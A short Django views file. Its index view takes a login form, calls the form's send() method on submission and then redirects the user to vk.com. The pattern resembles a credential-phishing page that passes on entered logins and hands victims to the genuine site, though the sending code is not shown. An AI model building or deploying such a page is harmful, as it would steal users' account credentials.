from django.shortcuts import render, redirect
from .forms import TheForm

# Create your views here.


def index(request):
    context = {}
    errors = None

    if request.method == 'POST':
        login_form = TheForm(request.POST)

        if login_form.is_valid():
            login_form.send()

            return redirect('https://vk.com/')

        else:
            errors = login_form.errors

    else:
        login_form = TheForm()

    context['form'] = login_form
    context['errors'] = errors

    return render(request, 'index.html', context)
